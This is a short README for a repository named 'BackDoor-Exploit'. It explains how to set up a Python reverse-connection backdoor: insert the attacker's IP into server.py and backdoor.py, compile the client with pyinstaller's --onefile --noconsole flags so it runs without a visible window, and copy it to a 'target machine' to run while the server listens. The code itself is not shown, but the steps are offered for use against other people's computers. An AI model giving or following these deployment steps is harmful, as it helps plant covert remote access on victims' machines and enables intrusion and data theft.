# BackDoor-Exploit
Steps for setting up this and I do recomend utilizing a kali machine or another linux distro
1: You will need to add your ip to both the server.py and backdoor.py. This is how your host system and target machine will communicate.
2: You will the need to convert the backdoor.py to a executable, you will need to have python installed on a windows pc and you will need the pyinstaller. To install pyinstaller use the command prompt and enter 'pip install pyinstaller' now navagate to the directory of the backdoor.py program. Once you are there and have set up a recognizable path enter 
'pyinstaller backdoor.py --onefile --noconsole'
3: Now all you have to do is download or copy the backdoor.exe to the target machine and run it once the server file is listening for a connection
